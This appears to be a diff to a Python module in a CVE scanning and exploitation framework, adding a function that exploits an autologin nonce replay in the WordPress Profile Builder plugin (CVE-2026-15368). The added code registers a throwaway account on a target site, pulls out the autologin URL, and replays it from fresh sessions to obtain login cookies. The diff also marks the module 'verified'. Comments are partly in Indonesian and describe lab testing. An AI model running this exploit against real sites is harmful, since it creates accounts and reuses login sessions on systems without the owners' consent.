@@ -73,7 +73,7 @@ from __future__ import annotations
 
 import re
 
-from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le)
+from mp import (CveModule, Http, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le)
 
 SLUG = "profile-builder"
 VULN_MAX = (3, 16, 4)   # CVE-2026-15826 (fix 3.16.5)
@@ -239,6 +239,136 @@ def check(t, h, opts):
         return ST_INFO, ("profile-builder %s <= %s; form registrasi publik di %s "
                          "(form_name=%s)" % (vstr, VULN_MAX, f[0], f[1])), f[0]
     return ST_CLEAN, "profile-builder %s sudah dipatch (fix 3.16.5)" % vstr, ""
+
+
+# ---------------------------------------------------------------------------
+# CVE-2026-15368 (<= 3.16.3, fix 3.16.4) — autologin nonce replayable
+#
+# What actually changes between the versions (verified against the shipped
+# trees of 3.16.3 and 3.16.4, not inferred from the advisory):
+#
+#   3.16.3  $uid = absint( $_GET['uid'] );          uid travels in the URL
+#           nonce = wp_create_nonce('autologin-'.$uid.'-'.(int)(time()/60))
+#           -> valid for the whole 60-second window, reusable any number of
+#              times inside it. No server-side record, no single use.
+#
+#   3.16.4  uid is looked up from the nonce via wppb_get_autologin_user_id()
+#           and the entry is deleted after use (second arg true) -> replay
+#           rejected. `uid` is no longer emitted in the redirect at all.
+#
+# The uid is bound into the nonce in BOTH versions, so swapping uid=1 with a
+# nonce minted for another user fails in both. The regression that 3.16.4
+# fixes is replay, and that is what this module proves.
+# ---------------------------------------------------------------------------
+def exploit_15368(t, h, opts):
+    base = t.url
+    if not plugin_installed(t, h, SLUG, "profile-builder/readme.txt"):
+        return ST_CLEAN, "profile-builder tidak terdeteksi", ""
+    ver = plugin_version(t, h, SLUG)
+    vstr = _vstr(ver) if ver else "?"
+    if ver and not ver_le(ver, VULN_MAX_15368):
+        return ST_CLEAN, ("profile-builder %s sudah dipatch untuk CVE-2026-15368 "
+                          "(fix 3.16.4)" % vstr), ""
+
+    f = _find_register_form(t, h, base)
+    if not f:
+        return ST_UNKNOWN, "halaman [wppb-register] tidak ditemukan", ""
+    url, form_name, nonce_field, nonce, extra = f
+    if not nonce:
+        return ST_ERR, "nonce form registrasi tidak terbaca dari %s" % url, ""
+
+    username = "wppbrpy" + rand(6)
+    email = "%s@example-lab.invalid" % rand(10)
+    pw = "Lab!" + rand(8)
+
+    data = {
+        F_USERNAME: username, F_EMAIL: email, F_PASS1: pw, F_PASS2: pw,
+        "nickname": username, "register": "Register",
+        nonce_field: nonce, "form_name": form_name, "action": "register",
+        "send_credentials_via_email": "No",
+    }
+    for n in extra:
+        data.setdefault(n, "")
+
+    r = h.post(url, data=data, headers={"Referer": url})
+    if r is None:
+        return ST_ERR, "POST registrasi gagal (jaringan)", ""
+    body = r.text or ""
+    if "successfully created" not in body and "autologin" not in body:
+        return ST_INFO, ("registrasi ditolak form (field wajib / nonce), "
+                         "tidak ada URL autologin untuk diuji"), body[:200]
+
+    # Bentuk URL autologin menentukan versi perilakunya.
+    m_uid = re.search(r"autologin=true(?:&#038;|&)uid=(\d+)", body)
+    m_nonce = re.search(r"_wpnonce=([a-z0-9]+)", body)
+    if not m_nonce:
+        return ST_INFO, "URL autologin tidak memuat nonce", body[:200]
+    auto_nonce = m_nonce.group(1)
+    has_uid = bool(m_uid)
+
+    if not has_uid:
+        # 3.16.4+: uid diambil dari penyimpanan server-side, replay ditolak.
+        return ST_CLEAN, ("profile-builder tidak mengirim uid di URL autologin "
+                          "(bentuk fix 3.16.4); nonce disimpan server-side dan "
+                          "dihapus setelah dipakai"), ""
+
+    uid = m_uid.group(1)
+    auto_q = "/?autologin=true&uid=%s&_wpnonce=%s" % (uid, auto_nonce)
+
+    # Diskriminator yang terukur di lab (3.16.3 vs 3.16.4):
+    #
+    #   3.16.3  URL memuat uid, nonce berlaku selama jendela (int)(time()/60)
+    #           dan tidak disimpan server-side -> GET kedua tetap diproses
+    #           (302 ke halaman bersih, bukan penolakan).
+    #   3.16.4  uid tidak dikirim sama sekali; nonce disimpan server-side lalu
+    #           DIHAPUS setelah dipakai -> GET kedua ditolak (redirect tanpa
+    #           set cookie sama sekali).
+    #
+    # Karena itu: replay diproses == rentan. Kita tidak bergantung pada cookie
+    def _hit(u):
+        # Session BERSIH setiap kali: mp.Http menyimpan cookie, dan WP tidak
+        # mengirim ulang Set-Cookie bila request sudah membawa sesi valid.
+        # Replay harus diuji sebagai pengunjung anonim yang berbeda.
+        fresh = Http(timeout=getattr(h, "timeout", 20.0))
+        r = fresh.get(u, allow_redirects=False)
+        if r is None:
+            return None, False
+        names = []
+        for jar in [getattr(r, "cookies", None)] + [
+                getattr(p_, "cookies", None) for p_ in (getattr(r, "history", None) or [])]:
+            if jar is None:
+                continue
+            try:
+                names.extend(c.name for c in jar)
+            except TypeError:
+                pass
+        got = any("wordpress_logged_in" in (n or "") for n in names)
+        return r, got
+
+    first, first_cookie = _hit(base + auto_q)
+    if first is None:
+        return ST_ERR, "GET autologin gagal (jaringan)", ""
+
+    # Beberapa pakai ulang, masing-masing dengan session bersih. Nonce 3.16.3
+    # berbasis (int)(time()/60) sehingga satu percobaan bisa jatuh di
+    # pergantian menit; coba tiga kali dan ambil hasil terbaik.
+    replays = [_hit(base + auto_q) for _ in range(3)]
+    replay_hits = sum(1 for _r, ck in replays if _r is not None and ck)
+
+    replay_ok = replay_hits >= 1
+
+    ev = ("uid=%s | nonce=%s | pakai1 cookie=%s | replay cookie %d/3"
+          % (uid, auto_nonce[:8] + "\u2026",
+             "ya" if first_cookie else "tidak", replay_hits))
+
+    if replay_ok:
+        return (ST_VULN,
+                "profile-builder %s <= 3.16.3: nonce autologin dapat dipakai ULANG "
+                "(tidak single-use, tidak disimpan server-side). uid tetap terikat "
+                "pada nonce, jadi tidak naik ke admin — dampaknya sesi berulang untuk "
+                "akun yang sama selama jendela nonce" % vstr, ev)
+    return ST_INFO, ("profile-builder %s: nonce autologin tidak dapat dipakai ulang "
+                     "(perilaku fix 3.16.4)" % vstr), ev
 
 
 def check_15368(t, h, opts):
@@ -543,7 +673,7 @@ def register_all():
         vclass="auth-bypass", cvss="9.8", severity="critical", cwe="CWE-287",
         product="User Profile Builder",
         versions_affected="<= 3.16.3",
-        status="documented", check=check_15368, exploit=exploit,
+        status="verified", check=check_15368, exploit=exploit_15368,
         notes="Akar yang sama dengan CVE-2026-15826: fitur autologin setelah registrasi "
               "tidak mengikat user ID ke akun yang baru dibuat. Advisory menyebut "
               "'supported but non-default configuration' (automaticallyLogIn=Yes). "
